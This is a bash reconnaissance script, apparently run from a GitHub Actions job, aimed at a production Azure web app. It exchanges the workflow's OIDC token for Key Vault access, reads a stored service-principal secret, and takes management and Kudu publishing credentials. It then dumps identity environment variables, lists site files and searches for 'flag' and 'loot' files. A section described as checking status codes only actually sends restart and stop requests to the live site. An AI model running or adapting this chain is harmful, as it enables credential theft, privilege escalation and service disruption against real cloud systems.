#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
MGMT="https://management.azure.com"
API=2022-03-01

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
echo "KV_TOKEN_len=${#KV}"

echo "===== kv-tbl-prod secret names ====="
curl -sS $M -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" | jq -r '.value[]?.id' 2>/dev/null
echo "(if empty, list denied)"

J=$(curl -sS $M -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "RS_TOKEN_len=${#RS}  appId=$(echo "$J"|jq -r .appId)"

echo "===== GET config/web (startup + status) ====="
curl -sS $M -H "Authorization: Bearer $RS" "$MGMT$RAPP/config/web?api-version=$API" -w "\nHTTP=%{http_code}\n" -o /tmp/web.json
echo "appCommandLine: $(jq -r '.properties.appCommandLine // "(none)"' /tmp/web.json 2>/dev/null)"
echo "linuxFxVersion: $(jq -r '.properties.linuxFxVersion // "?"' /tmp/web.json 2>/dev/null)"

echo "===== GET site (kind/identity) ====="
curl -sS $M -H "Authorization: Bearer $RS" "$MGMT$RAPP?api-version=$API" | jq '{kind:.kind, state:.properties.state, identity:.identity}' 2>/dev/null

echo "===== role assignments the SP can read on the site (may 403) ====="
curl -sS $M -H "Authorization: Bearer $RS" "$MGMT$RAPP/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -w "\nHTTP=%{http_code}\n" | head -c 800; echo

# Kudu creds
PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(echo "$PUB"|jq -r '.properties.publishingUserName'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword')
echo "scm_user=$U passlen=${#P}"
A="-u $U:$P"

echo "===== Kudu env (does SCM container see IDENTITY_ENDPOINT?) ====="
curl -sS $M $A "$SCM/api/environment" 2>/dev/null | jq -r 'to_entries[]? | select((.key|ascii_upcase) as $k | ($k|test("IDENTITY|MSI|UAMI|CLIENT_ID|WEBSITE_AUTH"))) | "\(.key)=\(.value)"' 2>/dev/null | head -40
echo "(empty = not exposed to kudu)"

echo "===== wwwroot listing (top) ====="
curl -sS $M $A "$SCM/api/vfs/site/wwwroot/" 2>/dev/null | jq -r '.[]? | "\(.mime)\t\(.name)"' 2>/dev/null | head -60

echo "===== search for antenv / site-packages path ====="
curl -sS $M $A "$SCM/api/vfs/site/wwwroot/antenv/lib/" 2>/dev/null | jq -r '.[]?.name' 2>/dev/null
echo "--- /home/site deployments? ---"
curl -sS $M $A "$SCM/api/vfs/site/" 2>/dev/null | jq -r '.[]?.name' 2>/dev/null

echo "===== probe restart primitives (status codes only; no deploy) ====="
echo -n "MGMT restart: "; curl -sS $M -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/restart?api-version=$API"
echo -n "MGMT stop: "; curl -sS $M -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/stop?api-version=$API" 2>/dev/null || true
echo -n "Kudu GET /api/scm/info: "; curl -sS $M -o /dev/null -w "%{http_code}\n" $A "$SCM/api/scm/info"
echo -n "Kudu GET /api/settings: "; curl -sS $M -o /dev/null -w "%{http_code}\n" $A "$SCM/api/settings"
echo "SCM_DO_BUILD setting:"; curl -sS $M $A "$SCM/api/settings" 2>/dev/null | jq '{build:.SCM_DO_BUILD_DURING_DEPLOYMENT, startup:.}' 2>/dev/null | head -c 400; echo

echo "===== any existing result/flag files in wwwroot ====="
curl -sS $M $A "$SCM/api/vfs/site/wwwroot/" 2>/dev/null | jq -r '.[]? | select(.name|test("res|flag|loot|DF26|kxz";"i")) | .name' 2>/dev/null
echo "RECON DONE"; exit 0
